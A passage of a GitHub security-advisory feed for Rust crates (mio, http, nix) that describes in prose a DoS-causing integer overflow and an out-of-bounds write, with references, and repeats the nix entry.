This vulnerability is also known as <a href="https://rustsec.org/advisories/RUSTSEC-2024-0019.html">RUSTSEC-2024-0019</a>.</p>
<p>Thank you to @rofoun and @radekvit for discovering and reporting this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tokio-rs/mio/security/advisories/GHSA-r8w9-5wcg-vfj7">https://github.com/tokio-rs/mio/security/advisories/GHSA-r8w9-5wcg-vfj7</a></li>
<li><a href="https://github.com/tokio-rs/tokio/issues/6369">https://github.com/tokio-rs/tokio/issues/6369</a></li>
<li><a href="https://github.com/tokio-rs/mio/pull/1760">https://github.com/tokio-rs/mio/pull/1760</a></li>
<li><a href="https://github.com/tokio-rs/mio/commit/90d4fe00df870acd3d38f3dc4face9aacab8fbb9">https://github.com/tokio-rs/mio/commit/90d4fe00df870acd3d38f3dc4face9aacab8fbb9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27308">https://nvd.nist.gov/vuln/detail/CVE-2024-27308</a></li>
<li><a href="https://github.com/advisories/GHSA-r8w9-5wcg-vfj7">https://github.com/advisories/GHSA-r8w9-5wcg-vfj7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r8w9-5wcg-vfj7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-04T20:44:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[http] Duplicate Advisory: Integer Overflow in HeaderMap::reserve() can cause Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-xvc9-xwgj-4cq9</id>
        <link href="https://github.com/advisories/GHSA-xvc9-xwgj-4cq9"/>
        <updated>2024-02-21T19:50:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-x7vr-c387-8w57. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>HeaderMap::reserve() used usize::next_power_of_two() to calculate the increased capacity. However, next_power_of_two() silently overflows to 0 if given a sufficiently large number in release mode.</p>
<p>If the map was not empty when the overflow happens, the library will invoke self.grow(0) and start infinite probing. This allows an attacker who controls the argument to reserve() to cause a potential denial of service (DoS).</p>
<p>The flaw was corrected in 0.1.20 release of http crate.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-25008">https://nvd.nist.gov/vuln/detail/CVE-2019-25008</a></li>
<li><a href="https://github.com/hyperium/http/issues/352">https://github.com/hyperium/http/issues/352</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2019-0033.html">https://rustsec.org/advisories/RUSTSEC-2019-0033.html</a></li>
<li><a href="https://github.com/advisories/GHSA-xvc9-xwgj-4cq9">https://github.com/advisories/GHSA-xvc9-xwgj-4cq9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xvc9-xwgj-4cq9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-06-16T23:08:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nix] Out-of-bounds Write in nix]]></title>
        <id>https://github.com/advisories/GHSA-76w9-p8mg-j927</id>
        <link href="https://github.com/advisories/GHSA-76w9-p8mg-j927"/>
        <updated>2024-02-21T19:15:13.000Z</updated>
        <content type="html"><![CDATA[<p>On certain platforms, if a user has more than 16 groups, the nix::unistd::getgrouplist function will call the libc getgrouplist function with a length parameter greater than the size of the buffer it provides, resulting in an out-of-bounds write and memory corruption.</p>
<p>The libc getgrouplist function takes an in/out parameter ngroups specifying the size of the group buffer. When the buffer is too small to hold all of the requested user's group memberships, some libc implementations, including glibc and Solaris libc, will modify ngroups to indicate the actual number of groups for the user, in addition to returning an error. The version of nix::unistd::getgrouplist in nix 0.16.0 and up will resize the buffer to twice its size, but will not read or modify the ngroups variable. Thus, if the user has more than twice as many groups as the initial buffer size of 8, the next call to getgrouplist will then write past the end of the buffer.</p>
<p>The issue would require editing /etc/groups to exploit, which is usually only editable by the root user.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45707">https://nvd.nist.gov/vuln/detail/CVE-2021-45707</a></li>
<li><a href="https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/nix/RUSTSEC-2021-0119.md">https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/nix/RUSTSEC-2021-0119.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2021-0119.html">https://rustsec.org/advisories/RUSTSEC-2021-0119.html</a></li>
<li><a href="https://github.com/advisories/GHSA-wgrg-5h56-jg27">https://github.com/advisories/GHSA-wgrg-5h56-jg27</a></li>
<li><a href="https://github.com/nix-rust/nix/issues/1541">https://github.com/nix-rust/nix/issues/1541</a></li>
<li><a href="https://github.com/advisories/GHSA-76w9-p8mg-j927">https://github.com/advisories/GHSA-76w9-p8mg-j927</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-76w9-p8mg-j927</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-01-06T22:07:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nix] Out-of-bounds Write in nix]]></title>
        <id>https://github.com/advisories/GHSA-76w9-p8mg-j927</id>
        <link href="https://github.com/advisories/GHSA-76w9-p8mg-j927"/>
        <updated>2024-02-21T19:15:13.000Z</updated>
        <content type="html"><![CDATA[<p>On certain platforms, if a user has more than 16 groups, the nix::unistd::getgrouplist function will call the libc getgrouplist function with a length parameter greater than the size of the buffer it provides, resulting in an out-of-bounds write and memory corruption.</p>
<p>The libc getgrouplist function takes an in/out parameter ngroups specifying the size of the group buffer. When the buffer is too small to hold all of the requested user's group memberships, some libc implementations, including glibc and Solaris libc, will modify ngroups to indicate the actual number of groups for the user, in addition to returning an error. The version of nix::unistd::getgrouplist in nix 0.16.0 and up will resize the buffer to twice its size, but will not read or modify the ngroups variable. Thus, if the user has more than twice as many groups as the initial buffer size of 8, the next call to getgrouplist will then write past the end of the buffer.</p>
<p>The issue would require editing /etc/groups to exploit, which is usually only editable by the root user.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45707">https://nvd.nist.gov/vuln/detail/CVE-2021-45707</a></li>
<li><a href="https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/nix/RUSTSEC-2021-0119.md">https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/nix/RUSTSEC-2021-0119.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2021-0119.html">https://rustsec.org/advisories/RUSTSEC-2021-0119.html</a></li>
<li><a href="https://github.com/advisories/GHSA-wgrg-5h56-jg27">https://github.com/advisories/GHSA-wgrg-5h56-jg27</a></li>
<li><a href="https://github.com/nix-rust/nix/issues/1541">https://github.com/nix-rust/nix/issues/1541</a></li>
<li><a href="https://github.com/advisories/GHSA-76w9-p8mg-j927">https://github.com/advisories/GHSA-76w9-p8mg-j927</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-76w9-p8mg-j927</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-01-06T22:07:14.000Z</published>
    </entry>
</feed>